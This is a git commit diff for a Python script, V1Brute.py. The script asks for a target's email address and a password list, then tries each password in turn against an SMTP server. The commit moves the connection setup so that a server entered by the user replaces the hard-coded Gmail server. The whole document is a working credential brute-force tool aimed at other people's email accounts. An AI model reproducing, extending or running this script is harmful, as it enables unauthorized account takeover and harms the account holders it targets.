7b09bcb68fa2cf33816c382bfa38fdc791a821f7
V1 MoDzZz <67358940+V1MoDzZz@users.noreply.github.com>
2021-01-04 18:40:57 +0500

    Update V1Brute.py

--- V1Brute.py
+++ V1Brute.py
@@ -1,9 +1,7 @@
 import smtplib
 import sys
 
-smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
-smtpserver.ehlo()
-smtpserver.starttls()
+
 
 sys.ps1 = '\033[01;32m '
 print(sys.ps1)
@@ -22,9 +20,19 @@ print("connection successful")
 
 print("made by V1 MoDzZz")
 
-user = input("Enter the targets email address: ")
+user = input("Enter the targets email address : ")
 
-pwfile = input("what is your password file directory: ")
+proto = input('Protocol : ')
+
+smtpserver = smtplib.SMTP(proto, 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+
+
+pwfile = input("what is your password file directory : ")
+
+
 pwfile = open(pwfile, "r")
 print("Checking all passowrds in the list please hold on it will take some time depends on password list and password")
 
@@ -36,3 +44,4 @@ for password in pwfile:
         
     except smtplib.SMTPAuthenticationError:
         print(password, "is not the password")
+        
